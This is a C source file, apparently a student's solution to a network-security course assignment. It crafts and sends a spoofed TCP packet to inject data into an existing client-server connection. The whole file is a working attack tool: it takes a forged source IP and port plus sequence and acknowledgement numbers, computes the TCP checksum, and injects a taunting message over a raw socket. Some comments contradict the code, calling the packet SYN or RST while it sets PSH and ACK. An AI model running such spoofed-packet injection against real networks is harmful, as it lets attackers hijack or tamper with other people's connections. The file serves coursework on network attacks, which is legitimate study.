/*
* Author: Cody Clark 30010560
* This is the attack for CPSC526 Assignment 3 Attack 2: Fake SYN
* Code for computing TCP checksums is based on code found at: 
* https://stackoverflow.com/questions/26774761/ip-and-tcp-header-checksum-calculate-in-c
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PORT 30560 // The port the client, server, and attacker will use
#define PACKET_LEN 1500

struct pseudo_tcp {
	unsigned saddr, daddr; // IP Source/Destination addresses
	unsigned char res; // Resevered 0000 0000
	unsigned char ptcl; // Protocol
	unsigned short tcpl; // TCP Segment Length (Must be calculated)
	struct tcphdr tcp;
	char payload[PACKET_LEN];
};

// Method declarations
unsigned short calculate_tcp_checksum(struct ip *ip);
void send_raw_ip_packet(struct ip *ip);
unsigned short in_chksum(unsigned short* buf, int length);

int main(int argc, char ** argv) {
	
	// Make sure the proper format is used
	if (argc != 6) {
		printf("Usage: attack2 <srcIP> <srcPORT> <destIP> <seq> <ack>\n");
		exit(0);
	}

	char buffer[PACKET_LEN];
	struct ip *ip = (struct ip *) buffer; // IP Packet
	printf("IP location: %x | ", ip);
	struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ip)); // TCP Packet starts after IP packet header
	printf("TCP location %x | ", tcp);
	char *msg = (char*)(buffer + sizeof(struct ip) + sizeof(struct tcphdr)); // Message starts after TCP header
	printf("Msg location: %x | ", msg);

	memset(buffer, 0, PACKET_LEN);
	char *eptr;

	// Pack the TCP packet
	tcp->th_sport = htons((unsigned short)strtoul(argv[2], &eptr, 10)); // Source port as per UCID
	tcp->th_dport = htons(PORT); // Destination port as per UCID
	tcp->th_seq = htonl(strtoul(argv[4], &eptr, 10)); // Sequence number
	tcp->th_ack = htonl(strtoul(argv[5], &eptr, 10)); // Sequence number
	printf("Sequence number: %lu\n", ntohl(tcp->th_seq));
	printf("Acknowledgement number: %lu\n", ntohl(tcp->th_ack));
	tcp->th_off = 5; // Offset (Number of 32 bit words in header)
	tcp->th_flags = TH_PUSH | TH_ACK; // This will be a RST packet
	tcp->th_win = htons(10000); // Used for flow control
	tcp->th_sum = 0; // Checksum

	// Fill in the message
	strcpy(msg, "Haha, you've been owned, sucka!");
	printf(buffer + sizeof(struct ip) + sizeof(struct tcphdr));

	// Pack the IP packet
	ip->ip_v = 4; // IPv4
	ip->ip_hl = 5; // Length of header in 32 bit words, min is 5
	ip->ip_ttl = 50; // Time to live
	ip->ip_p = IPPROTO_TCP; // Using TCP protocol
	ip->ip_src.s_addr = inet_addr(argv[1]); // Enter the client's IP address
	ip->ip_dst.s_addr = inet_addr(argv[3]); // Enter the server's ip address
	ip->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + strlen(msg)); // Total packet size
	printf("Total length of packet: %d\n", ntohs(ip->ip_len));

	
	printf("Message: %s\n", msg);

	// Calculate the TCP checksum, IP checksum is calculated by OS
	tcp->th_sum = calculate_tcp_checksum(ip);

	// Send the packet
	send_raw_ip_packet(ip);

	return 0;
}

// Calculates a one's compliment checksum
unsigned short in_chksum(unsigned short *buf, int length)
{
	unsigned short *w = buf;
	int nleft = length; // length is the length of buf in bytes
	int sum = 0;
	unsigned short temp = 0;

	// Sums each 2 bytes in buf
	while (nleft > 1) {
		sum += *w++; 
		nleft -= 2;
	}

	// If length was odd, process the last byte
	if (nleft == 1) {
		*(u_char*)(&temp) = *(u_char*)w;
		sum += temp;
	}

	sum = (sum >> 16) + (sum & 0xffff); // Add hi 16 to low 16
	sum += (sum >> 16); // Add carry
	return (unsigned short)(~sum); // Bitwise negation
}

// Calculates the TCP checksum
unsigned short calculate_tcp_checksum(struct ip *ip) {
	struct tcphdr *tcp = (struct tcphdr *)((unsigned char *)ip + sizeof(struct ip)); // Get the tcp packet

	int tcp_len = ntohs(ip->ip_len) - sizeof(struct ip);

	// Create the pseudo IP header
	struct pseudo_tcp p_tcp;
	memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

	// Set the pseudo IP header fields
	p_tcp.saddr = ip->ip_src.s_addr;
	p_tcp.daddr = ip->ip_dst.s_addr;
	p_tcp.res = 0;
	p_tcp.ptcl = IPPROTO_TCP;
	p_tcp.tcpl = htons(tcp_len);
	memcpy(&p_tcp.tcp, tcp, tcp_len);

	return (unsigned short)in_chksum((unsigned short *)&p_tcp, tcp_len + 12);
}

// Creates a raw socket and then sends a packet through it
void send_raw_ip_packet(struct ip *ip) {
	struct sockaddr_in dest_info;

	// Create a raw socket
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	// Use IPv4, set the destination address
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->ip_dst;

	// Send the packet to the destination
	printf("Bytes sent:%d\n", sendto(sockfd, ip, ntohs(ip->ip_len), 0, (struct sockaddr*)&dest_info, sizeof(dest_info)));

	close(sockfd);
}

